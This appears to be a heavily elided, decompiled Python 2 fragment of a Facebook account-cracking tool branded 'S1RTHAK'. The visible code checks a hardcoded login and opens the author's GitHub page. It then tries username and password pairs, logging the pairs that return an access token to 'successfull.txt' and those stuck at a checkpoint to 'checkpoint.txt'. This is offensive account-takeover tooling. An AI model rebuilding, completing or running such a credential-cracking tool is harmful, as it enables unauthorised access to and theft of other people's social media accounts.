# S1RTHAK
# Decompile by Mardis (Tools by S1RTHAK)
...
while loop == 'true':
    ...
    if username == CorrectUsername:
        ...
        if password == CorrectPassword:
            ...
            os.system('xdg-open https://github.com/S1RTHAK')
    else:
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[*_*S1RTHAK Successful*_*]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('S1RTHAK/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '[S1RTHAK(CP) Login After 3 Days] ' + k + c + user + ' | ' + pass1 + '\n'
                cps = open('S1RTHAK/checkpoint.txt', 'a')
